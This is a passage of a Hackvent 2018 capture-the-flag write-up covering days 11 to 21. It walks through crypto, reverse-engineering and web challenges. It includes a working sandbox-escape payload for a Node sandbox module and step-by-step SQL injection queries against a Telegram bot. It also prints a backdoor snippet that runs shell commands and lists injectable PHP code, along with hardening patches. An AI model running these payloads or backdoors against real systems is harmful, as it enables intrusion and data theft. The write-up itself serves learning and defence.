I don't know of any way to access all variables in scope in JS, maybe you can get the Globals, but this will not be enough here.

So let's head over to *npm* and check the used module (https://www.npmjs.com/package/sandbox). This is the one that's used here. If you follow the repository link, you find the source code on GitHub (https://github.com/gf3/sandbox) and also the Issues!  
Checking those yields what we are searching for: Sandbox can be broken (https://github.com/gf3/sandbox/issues/50)  
This includes a small snippet:
```
new Function("
  return (
    this.constructor.constructor('
      return (this.process.mainModule.constructor._load
     )'
    )())"
  )()
("util").inspect("hi")
```
And in the comments below a small explanation. The part before `("util")` is basically a Node `require(...)`, so changing the code to:
```
new Function("return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())")()("./config.json")
```
to load the config file yourself and see its contents with the flag **HV18-YtH3-S4nD-bx5A-Nt4G**

## Day 11
**Crypt-o-Math 3.0**  
Last year's challenge was too easy? Try to solve this one, you h4x0r!
```
c = (a * b) % p
c=0x7E65D68F84862CEA3FCC15B966767CCAED530B87FC4061517A1497A03D2
p=0xDD8E05FF296C792D2855DB6B5331AF9D112876B41D43F73CEF3AC7425F9
b=0x7BBE3A50F28B2BA511A860A0A32AD71D4B5B93A8AE295E83350E68B57E5
```
finding "a" will give you the flag.

Ok, so lets check again the Writeup of last year (https://github.com/Angel0fDarkness/ctf/tree/master/hackvent2017#day-11) which was similar.  
First, we want to get the inverse of b using WolframAlpha: PowerMod[b, -1, p] = 0xd31a4cb8145156fd2947e17d41c9f502fec06d658d2a65092da8ea6ec0f  
Next, we compute a = c * inv(b) % p = 0x485631382d4288bb2cdf615fc4576b25ba2ee4c74f5e8598ba6bbdfae8f  
Then, convert this to ASCII to get: HV18-B»,ßa_ÄWk%º.äÇO^ºk½úè

Wait, what? The beginning is fine, but then only garbage :( Ok, this year is a little more work..  
I wrote a small script [crypt-o-math.py](day11/crypt-o-math.py) that does the same as we did manually with WolframAlpha by using the python module gmpy2. As the whole equation is in the modular p space, we can add p as often as we want on both sides of the equation and still have a valid one. So I am checking inside a loop to find another a that decodes to ASCII and has "HV18" in the beginning.  
By adding p 1337-times, we find the flag: **HV18-xLvY-TeNT-YgEh-wBuL-bFfz**

## Day 12
**SmartWishList**  
Santa's being really innovative this year!  
Send your wishes directly over your favorite messenger (telegram): \@smartwishlist_bot  
Hint(s):
 * How does the bot differentiate your wishes from other people?

So, we start by creating a chat room with the telegram bot they supplied to see what we can do here. The bot has some commands:
 * */start* and */stop* to initiate a new session. May come in handy when we broke something ;)
 * */addwish {My Wish}* to add a new wish (text) to our wishlist. The maximum length seems to be 47 characters.
 * */removewish {WishNr}* to remove a wish from our wishlist.
 * */showwishes* to display all wishes on the list

Ok, first idea was to trigger problems with */addwish* or */removewish*, like double-free or having special characters in the wishes..  
If you enter too much text with */addwish* there is an error message: `(1406, "Data too long for column 'wish' at row 3")`. This really looks like an SQL database..  
Using */removewish* it is also possible to remove wishes from other people if you know or guess their wish number ;)  
However, after some time, I didn't find a possibility to exploit the */addwish* or */removewish* commands.

Luckily, a friend of mine (already before the hint was out) had a problem with the bot because he had special characters in his telegram user name! So, the SQLi might be in the user name? This could be used by the bot to track who issues which command, so it would also fit to the hint. But the user name is quite limited (in character length), so its not so much to do here.. Please don't use SQLmap or similar, because this will generate a very high load so you get easily banned from telegram and also the exploit queries get very long, which is not usable here.

Lets start by finding out how the query looks like.. We use the */showwishes* command as this is most probably a SELECT. The user name in telegram is limited by 64 characters.  
By using a single quote ('), there is a new error: `(1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1")`. The same happens when using the last name, so the query seems to use first and last name directly!  
Check this again by using "a" as first name and "b'" as last name to get the error `(1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''a b''' at line 1")`, so the query adds a blank between the first and last name.  
Now we are going to check which tables are there.. :) (http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet) this comes in really handy if you do not work with SQL databases all day long..  
1. Find out the table names  
We use `' UNION SELECT table_name FROM information_schema.tables #`, which still fits in the first name, but we get an error !? `(1222, 'The used SELECT statements have a different number of columns')`.. Ok, by thinking again what */showwishes* does, it always prints us the number and the wish itself, so we need to output two columns, one as number, one as text. Therefore the correct query is: `' UNION SELECT 1,table_name FROM information_schema.tables #`  
```
1 - CHARACTER_SETS
1 - COLLATIONS
1 - COLLATION_CHARACTER_SET_APPLICABILITY
1 - COLUMNS
1 - COLUMN_PRIVILEGES
1 - ENGINES
1 - EVENTS
1 - FILES
1 - GLOBAL_STATUS
1 - GLOBAL_VARIABLES
1 - KEY_COLUMN_USAGE
1 - OPTIMIZER_TRACE
1 - PARAMETERS
1 - PARTITIONS
1 - PLUGINS
1 - PROCESSLIST
1 - PROFILING
1 - REFERENTIAL_CONSTRAINTS
1 - ROUTINES
1 - SCHEMATA
1 - SCHEMA_PRIVILEGES
1 - SESSION_STATUS
1 - SESSION_VARIABLES
1 - STATISTICS
1 - TABLES
1 - TABLESPACES
1 - TABLE_CONSTRAINTS
1 - TABLE_PRIVILEGES
1 - TRIGGERS
1 - USER_PRIVILEGES
1 - VIEWS
1 - INNODB_LOCKS
1 - INNODB_TRX
1 - INNODB_SYS_DATAFILES
1 - INNODB_FT_CONFIG
1 - INNODB_SYS_VIRTUAL
1 - INNODB_CMP
1 - INNODB_FT_BEING_DELETED
1 - INNODB_CMP_RESET
1 - INNODB_CMP_PER_INDEX
1 - INNODB_CMPMEM_RESET
1 - INNODB_FT_DELETED
1 - INNODB_BUFFER_PAGE_LRU
1 - INNODB_LOCK_WAITS
1 - INNODB_TEMP_TABLE_INFO
1 - INNODB_SYS_INDEXES
1 - INNODB_SYS_TABLES
1 - INNODB_SYS_FIELDS
1 - INNODB_CMP_PER_INDEX_RESET
1 - INNODB_BUFFER_PAGE
1 - INNODB_FT_DEFAULT_STOPWORD
1 - INNODB_FT_INDEX_TABLE
1 - INNODB_FT_INDEX_CACHE
1 - INNODB_SYS_TABLESPACES
1 - INNODB_METRICS
1 - INNODB_SYS_FOREIGN_COLS
1 - INNODB_CMPMEM
1 - INNODB_BUFFER_POOL_STATS
1 - INNODB_SYS_COLUMNS
1 - INNODB_SYS_FOREIGN
1 - INNODB_SYS_TABLESTATS
1 - SecretStore
1 - User
1 - Wish
```
The last three tables seem to be the application ones, especially "SecretStore" looks promising!
2. Find the column names  
Next, we search for the column names of "SecretStore". This time the query gets too long, so we use `' UNION SELECT 1,column_name FROM information_schema.columns` as first name and `WHERE table_name = 'SecretStore' #` as last name to get  
`1 - flag`
3. Extract data  
Ok, now we want to get the data out! Last query is `' UNION SELECT 1,flag FROM SecretStore #` which shows us the data  
`1 - HV18-M4k3-S0m3-R34L-N1c3-W15h`

Also see [telegram.png](day12/telegram.png)  
And we have the flag **HV18-M4k3-S0m3-R34L-N1c3-W15h**

## Day 13
**flappy's revenge**  
There were some rumors that you were cheating at our little game a few days ago ... like godmode, huh?  
Well, show me that you can do it again - no cheating this time.  
Location: telnet whale.hacking-lab.com 4242

After connecting with telnet to the given location, you see the flappy game from [Day 7](#day-7)! If you like to play games, you can just try until you make it to the final round to get the flag. Due to the remote telnet connection, the latency sometimes is quite high, so it can be frustrating ;)  
After playing for a while, you see that the script should be exactly the same as before, all the holes are at the same spot, so we can also use this information to write a script to play this for us !? Please see [flappy.py](day13/flappy.py) for my approach. However, the latency of the keyboard commands sent to the server and the output is not stable and too high for a script to work reliably. I wasn't able to build my script to win the game. You could change the `movement` array to add the amount of spaces to be sent in each block.

At the end you get the flag: **HV18-9hYf-LSY1-hWdZ-496n-Mbda**

## Day 14
**power in the shell**  
seems to be an easy one ... or wait, what?  
Encryped flag:  
`2A4C9AA52257B56837369D5DD7019451C0EC04427EB95EB741D0273D55`  
[power.ps1](day14/power.ps1)

Ok, we got a quite small Windows PowerShell script and the flag which was encrypted with that script. What does it do?
 * It reads the flag into $m
 * It computes the encrypted flag as $m ^ 2 mod $n

Therefore we know the flag is also in hex format (otherwise you cannot calculate with it) and the algorithm is RSA (c = m ^ e % p).  
Lets try to factorize $n. Using (http://factordb.com) with the decimal form of $n (5841003248923821029983205516125362074880976378154066185495120324708129), we find the factors instantly as `73197682537506302133452713613304371 x 79797652691134123797009598697137499`.  
Ok, next step is to use CrypTool with "Encrypt/Decrypt" > "Asymmetric" > "RSA Demonstration", then enter the factors as *p* and *q* and change the exponent *e* to be "2". But when we click on "Update Parameters", we get an error from CrypTool: [cryptool_error.png](day14/cryptool_error.png). The exponent e is not coprime to phi(n) and can therefore not be used for RSA encryption/decryption.. :(  
What can we do next? Use RSA but ignore this constraint? Is this even possible?

I started to search around why we have to test for e to be coprime of phi(n) and I found a stackexchange post: (https://crypto.stackexchange.com/questions/12255/in-rsa-why-is-it-important-to-choose-e-so-that-it-is-coprime-to-%CF%86n). The most interesting part is the first comment to the question itself which says: *The Rabin cryptosystem is similar to RSA but uses e=2, which trivially divides ϕ(n).* That's basically what we have here! e=2. So let's check out Rabin (https://en.wikipedia.org/wiki/Rabin_cryptosystem#Decryption).

Using the decryption script [Rabin.java](day14/Rabin.java), adapted from (https://github.com/arxenix/Rabin/tree/master/src/com/ankursundara/rabin) to get the flag: **HV18-DzKn-62Qz-dAab-fEou-ImjY**

## Day 15
**Watch Me**  
Turn on your TV! Santa will broadcast todays flag on his member channel. Can you get it without subscription?  
[HACKvent-2018_by_the_oneandonly_HaRdLoCk.ipa](day15/HACKvent-2018_by_the_oneandonly_HaRdLoCk.ipa)

I used *binwalk* to extract the ipa file and then loaded the application [HACKvent-2018](/home/hacker/ctf/hackvent2018/day15/_HACKvent-2018_by_the_oneandonly_HaRdLoCk.ipa.extracted/Payload/HACKvent-2018.app/HACKvent-2018) into *hopper*.  
In the Labels section, there already is a suspicious function `decryptFlag`. If you check the references to this function, then you see that it is called in `viewDidLoad` at address 0000000100006420. Shortly before, the payload (encrypted) is loaded shortly before at address 0000000100006410: `xQ34V+MHmhC8V88KyU66q0DE4QeOxAbp1EGy9tlpkLw=`.  
In `decryptFlag`, right at the beginning, a strange value is loaded, this could be our key at address 000000010000657c: `uQA\\-nM@=1wl\x1EbN!`. However, the key is changed in between it is loaded and used, so we have to check which operations are performed on the key.. The first one is to overwrite the first character with 0x78 (x), for all the others there is a small loop that increments each character by 3.  
Furthermore, we can see at address 0000000100006648 a call to `AES128DecryptedDataWithKey`, so its most probably AES-128 in ECB mode.

I wrote a small script [decrypt.py](day15/decrypt.py) to do the work and finally we get the flag: **HV18-Nc7c-VdEh-pCek-Bw08-jpM3**

## Day 16
**Pay 100 Bitcoins**  
*... or find the flag*  
It changed the host. Fortunately it doesn't do the full job ... so there's hope. Get the things straight again and find the flag.  
The OS is encrypted, but you know the key: **IWillNeverGetAVirus**  
[HACKvent_thx_awesome_1n1k.ova](day16/HACKvent_thx_awesome_1n1k.ova)

As soon as you start the VM, you see a short chkdsk screen going over all sectors, then a reboot and now you have the petya screen which tells you to pay the bitcoins to unlock your HDD. If you check a little on the internet, how Petya works e.g. (https://www.crowdstrike.com/blog/full-decryption-systems-encrypted-petya-notpetya/), you see that after infection, it tries to overwrite MBR and simulate a chkdsk screen on the next startup, which does the full harddisk encryption. This means that the image we received is infected with Petya but not encrypted yet!

To unpack the OVA, we can just use tar: `tar xvf HACKvent_thx_awesome_1n1k.ova`, afterwards we have the [HACKvent-disk001.vmdk](day16/HACKvent-disk001.vmdk) where the file system should be inside. To look inside, we have to install *libguestfs-tools* and then run `guestmount -a HACKvent-disk001.vmdk -r -v -i ./mnt`.  
After some time there is a prompt for a password, so it seems the file system is encrypted, but the challenge text already gives us the password the OS uses: *IWillNeverGetAVirus*. Enter this one and the file system is mounted to /mnt.

Now let's search for the flag, I started checking the common places (/home/\* or /root), then used `find mnt/ -iname flag` and after checking the file contents with `grep -r mnt/ "HV18"`, the flag is inside */etc/motd*: **HV18-622q-gxxe-CGni-X4fT-wQKw**

## Day 17
**Faster KEy Exchange**  
You were somehow able to intercept Santa's traffic.  
But it's encrypted. Fortunately, you also intercepted the key exchange and figured out what software he was using.....
```
a = 17577019968135092891915317246036083578063875217491307011102321322815719709605741738459191569497548099944025771002530369133716621942963853230082186943938164591230020725702755002287589522851172217336150522367152517270250629688405924844750026155547199020780202996200555426652190631837288299999083335649923708175859594750237448640513280683859296367607523542293538555215282798100455110266565881599829107971869244773384413618546118850868579583095489023778055976570366853411496753062216229293710557686212314300848121614558806328788578096144576605248971916454783615989429937555579437307320472405217413938048149254574677430624
b = 15228628318558071728245462802366236848375416102820239825350329247148900182647243994904519787528142824353837070194785550898962097219309344881183948914850354340893035399529028331238911753358245357848436203268982345430735846016484221944423499956958406189854969330305125479065873712331269870135028162018087451460656203085824963123310757985362748654204595136594184636862693563510767025800252822776154986386637346156842972134635578534633722315375292616298410141343725683471387328655106920310236007034951004329720717533666052625540760911360823548318810161367913281234234193760867208897459774865037319252137821553407707977377
message = jqMYIn4fzSqzIXArwJm/kPitNhf4lwhL0yPRKpF+NYXyPmhoEwNG/k2L5vCZqFWNPvTzisnu93/8uK/PZnnCGg==
```
[FasterKeyExchange.py](day17/FasterKeyExchange.py)

This time we are given a python script that takes care of establishing a session key between two parties (like Diffie-Hellman) and the values that are transmitted between the two. I guess it will be some different key exchange protocol that has a weakness which we can exploit, so lets look what the code does..

The `y_server` and `y_client` variables are what should be transmitted because that is what we have to enter in the script. So, I give my `y_server` to someone and it becomes his `y_client`. The key is then calculated by `calculate_key` as:  
`return (y * self.x) % self.p`  
`y` is the client value and `self.x` is set to `secrets.SystemRandom().randint(g, p-2)` by `get_random_x`.  
The `y_server` value is initialized by `calculate_y` as:  
`return (self.g * self.x) % self.p`

In order to get the random `x` value of the server, we can reverse the formula `y = (g * x) % p` to `x = (y * inv(g)) % p`. (Use `a` as `y_server` here)  
Afterwards we can calculate the key: `key = (y * x) % p`. (Use `b` as `y_client` here)  
Then we need to check the `encrypt` function, because the key is not used directly:
```
key = bytes(hashlib.md5(bytes(self.key, "utf-8")).hexdigest(), "utf-8")
cipher = AES.new(key, AES.MODE_CBC, iv=bytes(self.iv, "utf-8"))
cipher_text_bytes = cipher.encrypt(pad(b"The Advanced Encryption Standard (AES), also known by its original name Rijndael, is a specification for the encryption of electronic data established by the U.S. National Institute of Standards and Technology (NIST) in 2001.", AES.block_size))
print(b64encode(cipher_text_bytes))
```
I put together a script that does all the calculation nicely in [decrypt.py](day17/decrypt.py) and we get the flag: **HV18-DfHe-KE1s-w44y-b3tt-3r!!**

## Day 18
**Be Evil**  
*Only today and for this challenge, please.*  
 * Download [evil.jar](day18/evil.jar)
 * java -jar evil.jar

Thanks to scal for the artwork!

When running the java application, you see a screen that shows a smiley and when clicking on it, you were asked whether you are evil. However, there is no option to say "yes", which might be whats required from the challenge description..  
First, I use the Java decompiler JDcore at (http://www.javadecompilers.com) to get the source code. Most of the classes won't help much in the current form as they only contain a big array of bytes and nothing more.. The main function, however, is in `Evilist.java` and instanciates `EvilLoader` which does the magic:  
```
private byte[] loadEvilClass(String name) throws ClassNotFoundException
{
  Class clazz = EvilLoader.class.getClassLoader().loadClass(name);
  try {
      return (byte[])clazz.getField("b").get(clazz);
  }
```
The classes contain themselves as byte code.. Ok, lets dump the class *after* it has been loaded to get the source code. Add the import for `java.io.*` and change the function `loadEvilClass` in `EvilLoader.java` to:  
```
  private byte[] loadEvilClass(String name) throws ClassNotFoundException
  {
    Class clazz = EvilLoader.class.getClassLoader().loadClass(name);
    try {
        byte[] loadedClass = (byte[])clazz.getField("b").get(clazz);
        FileOutputStream classFile = new FileOutputStream(name);
        classFile.write(loadedClass);
        classFile.close();
        return loadedClass;

    }
    catch (IllegalArgumentException|IllegalAccessException|NoSuchFieldException|SecurityException|ClassFormatError|IOException e1)
    {
      throw new ClassNotFoundException(e1.toString());
    }
  }
```
Additionally, add all the possible classes to `Evilist.java`:  
```
    Class<?> clazz = loader.loadClass("hackvent2018.evil.EvilWindow");
    Class<?> action = loader.loadClass("hackvent2018.evil.EvilAction");
    Class<?> evil = loader.loadClass("hackvent2018.evil.Evil");
    Class<?> event = loader.loadClass("hackvent2018.evil.EvilEvent");
    Class<?> handler = loader.loadClass("hackvent2018.evil.EvilHandler");
    Class<?> images = loader.loadClass("hackvent2018.evil.EvilImages");
    Class<?> type = loader.loadClass("hackvent2018.evil.EvilType");
    Class<?> notEvil = loader.loadClass("hackvent2018.evil.NotEvil");
    Class<?> question = loader.loadClass("hackvent2018.evil.Question");
    Class<?> sad = loader.loadClass("hackvent2018.evil.Sad");
```
Then recompile all classes and run `java hackvent2018.evil.Evilist` to get the dumped byte arrays.  
Four of them are PNG images: *Evil, NotEvil, Question and Sad*.  
The others are java classes, so we have to decompile them again..

The class `EvilAction` has some checks inside for an environment variable. This has be a certain value that the "yes" option will be shown. to get this "key", we have to XOR `b = {-64, 15, 15, 10, 82, 79, 76, 67, 76}` and `NotEvil.b = {-119, 80, 78, 71, 13, 10, 26, 10, 0}`. The key is **{0x49, 0x5F, 0x41, 0x4D, 0x5F, 0x45, 0x56, 0x41, 0x4C}** or **I_AM_EVIL**.

Setting the env key `export I_AM_EVIL=1` and running the jar again will give you the option to say "yes" and then shows the flag **HV18-ztZB-nusz-r43L-wopV-ircY**.

Alternatively, you can see in `EvilEvent` that the flags are hidden inside the PNG images:  
```
    static String eventResult() {
        byte[] x = EvilEvent.xor((byte[])b, (byte[])NotEvil.b, (int)0);
        x = EvilEvent.xor((byte[])x, (byte[])Evil.b, (int)100);
        x = EvilEvent.xor((byte[])x, (byte[])Sad.b, (int)200);
        x = EvilEvent.xor((byte[])x, (byte[])Question.b, (int)300);
        return new String(x);
    }
```
So, the right one for us is in `Evil.b` and we can compute the flag ourselves.

## Day 19
**PromoCode**  
*Get your free flag*  
Santa is in good mood an gives away flags for free.  
Get your free flag [promo.html](day19/promo.html)

**Important**  
2018-12-19 20:05 CET: A slightly easier challenge has been released. Watch for the changed link above. Respect to those who solved it the 1337-way!  
The updated version can be found here: [promo.html](day19/update/promo.html).

*The below part was developed using the first and harder version of the challenge.*  
Searching through the [promo.js](day19/promo.js) file quickly shows that we have a WebAssembly here. The file is called [promo.wasm](day19/promo.wasm). The Web Assembly Binary Toolkit (https://webassembly.github.io/wabt) provides some tools to analyze and convert the source. Additionally, in Firefox Developer Tools Console you can debug and view the textual representation of the wasm. You quickly find a function called `_checkPromoCode` which references `func22`. So this is where the magic happens ;)  
Using the free version of the JEB decompiler (https://www.pnfsoftware.com/jeb/), I decompiled the function to [checkPromoCode.c](day19/checkPromoCode.c).  
We can see that there is something loaded from a global address space:  
```
   *((unsigned int)(((int)gvar_8) + ((int)r11))) = gvar_408;
    *((unsigned int)(((int)gvar_10) + ((int)r11))) = gvar_410;
    *((unsigned int)(((int)gvar_18) + ((int)r11))) = gvar_418;
    *((unsigned int)(((int)gvar_1C) + ((int)r11))) = gvar_41C;
    *r63 = *((long long*)(&aHV18_TRYH_ARDE_[0]));
    *((unsigned int)(((int)gvar_8) + ((int)r63))) = *((long long*)(&aHV18_TRYH_ARDE_[&gvar_8]));
    *((unsigned int)(((int)gvar_10) + ((int)r63))) = *((long long*)(&aHV18_TRYH_ARDE_[&gvar_10]));
    *((unsigned int)(((int)gvar_18) + ((int)r63))) = *((int*)(&aHV18_TRYH_ARDE_[&gvar_18]));
    *((unsigned int)(((int)gvar_1C) + ((int)r63))) = *((short*)(&aHV18_TRYH_ARDE_[&gvar_1C]));
```
The second part is the false flag we see when there is an error, the first part has exactly the same length, so lets investigate these memory adresses! As WebASM stores the data in little endian, we get the following array for the encrypted flag in memory:  
```
.data:00000400    gvar_400         dq F0BC51F36874F2C1h
.data:00000408    gvar_408         dq E357D1A08AAB8700h
.data:00000410    gvar_410         dq 2FEB8572F31271DEh
.data:00000418    gvar_418         dd ABABA787h
.data:0000041C    gvar_41C         dw 74FFh
```
which translates to `{ 0xC1, 0xF2, 0x74, 0x68, 0xF3, 0x51, 0xBC, 0xF0, 0x00, 0x87, 0xAB, 0x8A, 0xA0, 0xD1, 0x57, 0xE3, 0xDE, 0x71, 0x12, 0xF3, 0x72, 0x85, 0xEB, 0x2F, 0x87, 0xA7, 0xAB, 0xAB, 0xFF, 0x74 }`.

Now we can reverse engineer whats happening to decode the flag.  
`par0` is our input from the text field, it is checked to have a length of 15 with `int var50 = f32(par0); if(var50 == 15)`.  
Afterwards there is a small while loop that computes a checksum which has to be `217675` at the end.  
Finally, there is another for loop that decrypts the 30-character flag.

I wrote a small program to brute-force the possible promo codes which produce a valid checksum and printable and well-formed flag as output: [solve.cpp](day19/solve.cpp). It took around 30 minutes on my VM to check all possibilities and produce 41.376 possible and valid [flags_full.txt](day19/flags_full.txt).  
To reduce the amount of possibilities further, we can check all the flags. There are only few possibilities to get the necessary *HV18-* at the beginning of the decrypted flag: *h3b4h*, *h3b45*, *y3b4h*, *y3b45*, *F3b4h*, *F3b45m*, *W3b4h*, *W3b45*, *53b4h* and *53b4m* (the structure is always very similar). By looking at those possibilities, we can suspect that *W3b* could be leet-speak for Web and as this challenge is about Web Assembler or WebASM in short, this would be *W3b45m*. *W3b45* we already found as a valid prefix and by adding the additional *m*, we can reduce the amount. Now we have only 558 possible flags in [flags.txt](day19/flags.txt) which we have to look through for further possible leet-speak characters.

The promo code **W3b45m1sRlyF45t** (WebASM is really fast) results in our flag: **HV18-rKRV-Cg2G-jz4B-QrIy-OF9i**

## Day 20
**I want to play a game**  
Santa didn't forget about the games this year! Ready to play?  
Get your game [HaRdvent.nro](day20/HaRdvent.nro)

Doing a simple `strings HaRdvent.nro` brings mostly rubbish but also one suspicious strings: `shuffle*whip$crush%squeeze`. As always, google is your best friend.. The first result is (https://relrod.github.io/spritz/Crypto-Cipher-Spritz.html) :) After some more googling, I found a C implementation (https://github.com/cuhsat/spritz.c).  
The file itself is an Nintendo Switch binary and we can use (https://yuzu-emu.org) to run it. See the screenshot [emulator.png](day20/emulator.png). The only thing that it does is displaying a message:
```
Thank You Mario, But Our Princess is in Another Castle.
Encrypt this:
f42df92b389fffca59598465c7a51d36082ecfea567a900e5eac9e5e9fb1
```
Ok, so let's encrypt what we've got.
```
int main(void) {
        char data[31] = { 0xf4, 0x2d, 0xf9, 0x2b, 0x38, 0x9f, 0xff, 0xca, 0x59, 0x59, 0x84, 0x65, 0xc7, 0xa5, 0x1d, 0x36, 0x08, 0x2e, 0xcf, 0xea, 0x56, 0x7a, 0x90, 0x0e, 0x5e, 0xac, 0x9e, 0x5e, 0x9f, 0xb1 };
        char key[27] = { 's', 'h', 'u', 'f', 'f', 'l', 'e', '*', 'w', 'h', 'i', 'p', '$', 'c', 'r', 'u', 's', 'h', '%', 's', 'q', 'u', 'e', 'e', 'z', 'e', '\0' };

        spritz_encrypt( key, sizeof(key), data, sizeof(data) );
        printf( "%s\n", data );
}
```
See also [main.c](day20/spritz.c/main.c).

There is one important thing to note, that is the NULL-Byte terminator at the end of the key string. The key itself is only 26 bytes (the string we found using *strings*), but it is handed over to the encrypt function as an int array with length 27. So we have to include the NULL Byte at the end, otherwise the encryption will produce garbage.  
At the end we have the flag: **HV18-Wl8b-jSu3-TtHY-ziO4-5ikM**

## Day 21
**muffinCTF**  
*Day 1*  
```
DAY 1 Services
--------------------------------------------
      _______
     /       )
    /_____   | ______
   (  '   ) / /    __\   _____
    |.  '| / |     \ |  /     ))
    |____|/  |`-----'  /_____))
              `-----'  `------'

    Name: bakery
    Description:
        Simply the best bakery in town!
        The good smell goes around the streets.
        Make sure that the thieves of the enemy nations cannot steal our bread!
        Maybe you have a method where we can get more bread?
    Creator: muffinx


              / \  _  _  _  / \
              | | / \/ \/ \ | |
          %   | |I| || || |=o | %
          %   | | j_jj_jj_j | | %     v %
        V |   | ||_________|| | | .:,>@<%%
       >@<| ; | | | || || | | | | ~*~ | |%
       *| |:X:| |I| || || | | | |*'|`\|/||   ~@~   *
      ,||/|`|'|_| |_||_||_| |_|,||,|/ |,||Vv,`|',v`|v hjw

    Name: garden
    Description:
        A very beautiful vegetable/fruit garden.
        There is even a pond where there are swimming fish and jumping frogs.
        Fix the defenses, in our past we had attacks with fire arrows.
        Also we are short in potatoes, please get us some more.
    Creator: muffinx
```
(http://whale.hacking-lab.com:9280/)

To get the hackvent day 21 (muffinCTF day 1), you have achieve the following requirements, in at least 2 of the last 5 ticks (1 tick = 3 minutes).
 * Have garden or/and bakery running with the following stats:
  * attack points > 0
  * maximal defense points
  * maximal availability points

You have to download a VirtualBox VM which is quite vulnerable. It connects to the muffinCTF server through a tunnel and then you have to host those services. They have to work, so the server deploys flags to you and tests the functionality of each service but still you need to protect the service against malicious request that try to steal those deployed flags. Furthermore, you can also carry out attacks on the other people.  
Let's do a list of the found vulnerabilities in the VM / service and how to patch them.

**Note: This describes the vulnerabilities of the second (Mayhem) VM**

**VM**  
 * Disable all services but *bakery*, *garden* and *tunnel*, because the other ones are back-doored and not necessary for the functionality of the services.  
 `systemctl disable keep2 log barracks keep mill-frontend mill port tunn`
  * `log` is a logging service that can also be fixed if necessary. But make sure that this part is commented out (in `/root/log.py`), because it looks for a magic pattern and then executes the command directly:  
  ```
  if("$TREES$" in s):
    ex = s[(s.index("$TREES$")+len("$TREES$")):s.index("$ICECREAM$")]
    print(urllib.unquote(ex))
    out = subprocess.check_output([urllib.unquote(ex)],shell=True)
    print(out)
  ```
  * `tunn` is a useless service that looks like it belongs to tunnel because it is located in `/home/tunnel/tunn.py`, but it only connects to an IRC server, joins the channel *#yet_another_backdoor* and also waits for commands there. They will be executed directly.  
 * Change passwords for *root* and *user* using `passwd root` and `passwd user`
 * Modify `/etc/sudoers` and comment out the *kiwi* user
 * Set `sql.safe_mode = On` in `/etc/php/7.0/apache2/php.ini`
 * `/var/www/html/index.php` is served through *apache2* but contains a backdoor that directly executes shell code!
 * Apache2 configuration contains `ProxyPass /bakery/test/ http://127.0.0.1:80/` which serves the local /var/www/html directory.
 * The services are located in the /home folder in separate sub-directories. Change the permissions using `chmod -R go-rwx /home/*` and `chmod -R -w /home/*` and then only allow write access to folders/files that are really written by the services.
 * The *tunnel* service does not really work reliably, so I changed the systemd service file to add regular restarts:  
 ```
 WatchdogSec=300
 Restart=always
 ```
 * For all other services, also add the `Restart=always` line, just in case there is an error in your service which causes it to crash, it will automatically be restarted and back online as soon as possible (for availability points!)

**bakery** (all paths are relative to */home/bakery*)  
 * File `.../.php` (yes, three dots ;)) contains PHP comments and a backdoor that executes everything in the `_` GET-Parameter. Can be commented out or deleted completely as the file is not necessary for the service to work properly.
 * Remove all "breads" inside `breads` to avoid that someone already installed a back-door there.
 * The `breads` folder where all the "breads" are stored (name is a sha-1 hash) is accessible directly through the webserver, but this is necessary for the backend to check whether he successfully deployed flags to your service.
 * Searching using `grep -r . -e '<?php'` to check whether there is some hidden PHP code shows files of interest.
 * File `css/components/checkbox.php` is the same as the first one.
 * File `inc/breadSend.php` is necessary for the service, so the ping command has to work, but the current implementation is very easy to exploit by concatenating further system commands after the IP address. Therefore we have to sanitize the input. This is clearly not a perfect  
 ```
 if (filter_var($_GET['ip'], FILTER_VALIDATE_IP))
 {
   system('ping -c 1 ' . $_GET['ip']);
 }
 ```
 * File `inc/breads.php` uses the given input directly in an `eval()`, so we need to sanitize the input or change it to only do calculations, so we don't even need the `eval()` anymore. To secure the mathematical calculations, I used (https://github.com/dbojdo/eval-math).  
 ```
        $regex = "/^[0-9.,\/*+\-() ]+$/";
        if (preg_match($regex, $_GET['prize'], $matches) !== FALSE)
        {
                if (count($matches) > 0)
                {
                        $m = new EvalMath;
                        $m->suppress_errors = true;
                        $result = $m->evaluate($_GET['prize']);
                        echo number_format($result * 1.20, 2);
                        die();
                }
        }
 ```
 * File `inc/breads.php` has a second function to deploy flags from the backend to you. But it does not check the content, so anybody can deploy malicious code to your system or just flood it with data. Therefore we should check for valid flags:  
 ```
        $regex = "^/muffinCTF\{[a-z0-9]{40}\}$/"
        if (preg_match($regex, $bread_content, $matches) !== FALSE)
        {
                if (count($matches) > 0)
                {
                        $bread_name = md5($bread_content);
                        file_put_contents('../breads/'.$bread_name, $bread_content);
                }
        }
 ```
 * File `inc/inc.php` needs to include several pages for the service to work. We have to sanitize the input to only allow valid includes. To find those, we can use `grep -r . -e "inc.php"`.  
 ```
        if(isset($_GET['page'])) {
                $page = $_GET['page'];
                if (startsWith($page, "breads.php")
                ||  startsWith($page, "breadSend.php")
                || ($page === "../html/home.html")
                || ($page === "../html/breads.html")
                || ($page === "../html/breadSend.html"))
                {
                        include($page);
                }
        }
 ```
 * **DEFENSE:** I added the following code to all back-doors. It will slow down the attackers (because of `usleep()`) and also provide them with false flags they need to check with the muffinCTF backend, so this will also cost time :)  
 ```
 $amount = rand(5, 78);
 for ($i = 0; $i < $amount; $i++)
 {
   echo "muffinCTF{" . sha1(rand()) . "}\n";
   usleep(rand(1000, 50000));
 }
 ```

**garden** (all paths are relative to */home/garden*)  
 * File `database.pyc` is not used anywhere, so we can remove it.
 * File `garden.db` needs to be writable by the user garden so he can store and retrieve the flags.
 * There is a symlink in `static/garden.db` to the database outside the static folder. As all files inside the static folder are accessible directly, we need to remove this.
 * File `templates/home.html` contains exploitable Jinja template syntax. It seems that this template does not really work in the original version, so it should be safe to remove the template part there completely. Alternatively, you could add `{% autoescape true %}...{% endautoescape %}` around the whole template part to escape the input.
 * File `main.py` is the main service file, so it also contains some flaws:
  * The used secret key is the same for all VMs, so I changed it to: `APP_SECRET_KEY = os.urandom(64)`
  * Change the SQL SELECT query in line 76 to `b_vegs = db.session.execute( "SELECT * FROM vegetables WHERE md5=:h", {'h': hash} ).fetchall()`, then we use a parametrized statement and the SQL injection using the `hash` parameter is gone.
  * Change the YAML load call in line 96 to `veg = yaml.safe_load(veg)` to avoid injections using YAML.
